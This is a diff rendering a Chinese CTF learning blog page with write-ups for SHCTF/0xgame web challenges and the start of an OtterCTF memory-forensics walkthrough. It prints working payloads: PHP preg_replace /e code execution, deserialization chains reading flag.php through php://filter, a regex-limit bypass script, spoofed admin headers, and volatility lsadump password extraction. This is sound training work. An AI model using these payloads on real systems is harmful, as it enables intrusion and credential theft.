@@ -1,23 +1,2531 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
-{% block title %}{{ config.title }}{% if theme.index_with_subtitle and config.subtitle %} - {{config.subtitle }}{% endif %}{% endblock %}
 
-{% block page_class %}
-  {% if is_home() %}page-home{% endif -%}
-{% endblock %}
 
-{% block content %}
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这是一个学习博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="yzklov">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="yzklov">
+<meta property="og:description" content="这是一个学习博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="yzklov">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/page/2/"/>
+
+
+
+
+
+  <title>yzklov</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yzklov</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">nanashi</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
   <section id="posts" class="posts-expand">
-    {% for post in page.posts %}
-      {{ post_template.render(post, true) }}
-    {% endfor %}
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/SHCTF&0xgame.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/SHCTF&0xgame.html" itemprop="url">SHCTF&0xgame</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-06T13:12:22+08:00">
+                2023-10-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="SHCTF"><a href="#SHCTF" class="headerlink" title="SHCTF"></a>SHCTF</h1><h2 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h2><p>查看js，发现分数要大于99999，所以转到控制器</p>
+<p><img src="/img/image-20231006131627245.png" alt="image-20231006131627245"></p>
+<p>修改分数点击回车后，点击开始游戏就会弹出flag</p>
+<p><img src="/img/image-20231006131558566.png" alt="image-20231006131558566"></p>
+<p><img src="/img/image-20231006131759294.png" alt="image-20231006131759294"></p>
+<p>法二：直接在js中发现won函数，里面的unicode编码解码后就是flag</p>
+<p><img src="/img/image-20231006131912160.png" alt="image-20231006131912160"></p>
+<h2 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$pattern</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i&quot;</span>,<span class="variable">$code</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$pattern</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;print_r(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are smart&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;try again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;it is begin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">it is begin</span><br></pre></td></tr></table></figure>
+
+<p>重点代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27; . $pattern . &#x27;)/ei&#x27;,&#x27;print_r(&quot;\\1&quot;)&#x27;, $code);</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?code=$&#123;phpinfo()&#125; HTTP/1.1</span><br><span class="line">pattern=\S*</span><br></pre></td></tr></table></figure>
+
+<p>自己理解：正则匹配模式设置为：匹配输入字符串中的连续非空白字符序列，所以匹配到了${phpinfo()}，<code>\\1</code>捕获了该字符串，又由于是&#x2F;e模式：表示替换字符串中的匹配部分将被视为 PHP 代码，并执行它，所以<code>print_r(&quot;$&#123;phpinfo()&#125;&quot;)</code>被执行<br>在环境中找到flag<br><img src="/img/image-20231006144747769.png" alt="image-20231006144747769"></p>
+<h2 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var_1</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;p = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;z = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;q = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;./index.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>];</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no number!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="variable">$code</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no touch!&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">&#x27;2023SHCTF&#x27;</span>) === <span class="literal">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what do you want&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>绕过<code>if(preg_match(&quot;/[0-9]/&quot;, $num))</code>:因为preg_match第二个参数必须是string类型，当我们传入数组num[]&#x3D;1时，preg_match函数会报错，返回false。而后面intval函数的第一个参数是mixed：接受多种不同的数据类型，所以返回的是1，进入内层if。</p>
+<p><code>if(preg_match(&#39;/.+?SHCTF/is&#39;, $code))</code>绕过：字符串数量超过1000000时，preg_match函数会挂掉，后面再接上payload就不会被匹配到，上脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;very&quot;</span>*<span class="number">250000</span>+<span class="string">&quot;2023SHCTF&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/?num[]=1&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://112.6.51.212:30458&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;c[ode&#x27;</span>:code          <span class="comment">#这边[到php当中会被当做_</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url+payload,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231006153514460.png" alt="image-20231006153514460"></p>
+<h2 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a>[WEEK2]serialize</h2><p><img src="/img/image-20231011114101333.png" alt="image-20231011114101333"></p>
+<p>我们需要知道最后要的include在milaoshu类里，我们开始反推，<code>$this-&gt;gao=$this-&gt;fei;</code>把milaoshu赋给$this-&gt;fei触发<code>__tostring()</code>，然后musca中的<code>return $this-&gt;ding-&gt;dong; </code>把misca赋给<code>$this-&gt;ding</code>触发<code>_get</code>,到达__wakeup()，执行unserialize()时，先会调用这个函数，即到达入口。</p>
+<p>整个逻辑是传入序列化后的payload，反序列化的时候触发__wakeup()，然后到get再到tostring()，非常清晰。<br>数组绕过check，但是发现</p>
+<p><img src="/img/image-20231011114947899.png" alt="image-20231011114947899"></p>
+<p>这是因为get中调用了miaomiao，把Mikey Mouse~赋值给了成员属性$a,而后面的die括号中是$a,即终止程序并输出括号里的值作为报错信息，不管别的，这里没有输出include+伪协议的内容，那么我们就想到把报错信息改成伪协议读取。$this-&gt;gao&#x3D;$this-&gt;fei;触发的tostring，就添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct()&#123;</span><br><span class="line">    $this-&gt;a=&amp;$this-&gt;gao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wanna[fl.ag=a:1:&#123;i:0;O:5:&quot;musca&quot;:2:&#123;s:4:&quot;ding&quot;;O:5:&quot;misca&quot;:3:&#123;s:3:&quot;gao&quot;;N;s:3:&quot;fei&quot;;O:8:&quot;milaoshu&quot;:1:&#123;s:1:&quot;v&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;s:1:&quot;a&quot;;R:4;&#125;s:4:&quot;dong&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意参数中的_要改成[</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class misca&#123;</span><br><span class="line">    public $gao;</span><br><span class="line">    public $fei;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a=&amp;$this-&gt;gao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class musca&#123;</span><br><span class="line">    public $ding;</span><br><span class="line">    public $dong;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class milaoshu&#123;</span><br><span class="line">    public $v=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new misca();</span><br><span class="line">$b = new musca();</span><br><span class="line">$c = new milaoshu();</span><br><span class="line">$a-&gt;fei = $c;</span><br><span class="line">$b-&gt;ding = $a;</span><br><span class="line">echo serialize(array($b));</span><br></pre></td></tr></table></figure>
+
+<h2 id="WEEK1-生成你的邀请函吧"><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="[WEEK1]生成你的邀请函吧~"></a>[WEEK1]生成你的邀请函吧~</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">API：url/generate_invitation  </span><br><span class="line">Request：POST application/json  </span><br><span class="line">Body：&#123;  </span><br><span class="line">    &quot;name&quot;: &quot;Yourname&quot;,  </span><br><span class="line">    &quot;imgurl&quot;: &quot;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg&quot;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>根据题目要求直接改包</p>
+<p><img src="/img/image-20231102114828021.png" alt="image-20231102114828021"></p>
+<p>这样看是有数据的</p>
+<p><img src="/img/image-20231102114924326.png" alt="image-20231102114924326"></p>
+<p>放包，下载下来一个图片</p>
+<p><img src="/img/image-20231102115001804.png" alt="image-20231102115001804">****</p>
+<p><img src="/img/image-20231102115032865.png" alt="image-20231102115032865"></p>
+<h2 id="0xgame"><a href="#0xgame" class="headerlink" title="0xgame"></a>0xgame</h2><p>###[Week 1] signin </p>
+<p><img src="/img/image-20231001110256175.png" alt="image-20231001110256175"></p>
+<h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=QNKCDZO&amp;b=s878926199a HTTP/1.1</span><br><span class="line">Host: 120.27.148.152:50014</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line">Origin: http://120.27.148.152:50014</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: name=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line">Referer: http://120.27.148.152:50014/?a=QNKCDZO&amp;b=s878926199a</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">c=1024.1a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231001105621221.png" alt="image-20231001105621221"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?query=ctf HTTP/1.1</span><br><span class="line">Host: 120.27.148.152:50012</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: role=admin</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 14</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">action=getflag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/OtterCTF%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81wp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/OtterCTF%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81wp.html" itemprop="url">OtterCTF内存取证wp</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-03T11:51:21+08:00">
+                2023-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>故事背景是一个叫Rick瑞克的喜欢玩老式游戏的人，而且这人吧还总喜欢用比特彗星下载盗版电影种子，游戏种子，有一天他边玩游戏边下东西，突然电脑中了勒索病毒，文件被锁了，所有后缀变成了.locked，然后取证分析人员拷贝了内存镜像文件，来看看你能从被锁的文件中获取什么信息？</p>
+<h2 id="1-What-the-password"><a href="#1-What-the-password" class="headerlink" title="1 - What the password?"></a>1 - What the password?</h2><p>题目：你得到了瑞克电脑内存的样本，你能得到他的用户密码吗？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem imageinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231004110808864.png"></p>
+<p>镜像版本为Win7SP1x64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=&quot;Win7SP1x64&quot; lsadump</span><br></pre></td></tr></table></figure>
+
+<p>这里发现我的kali在root模式运行这条指令会报错，用户模式就可以</p>
+<p>lsadump可以强制显示密码</p>
+<p><img src="/./../img/image-20231003165745271.png" alt="image-20231003165745271"></p>
+<p>flag{MortyIsReallyAnOtter}</p>
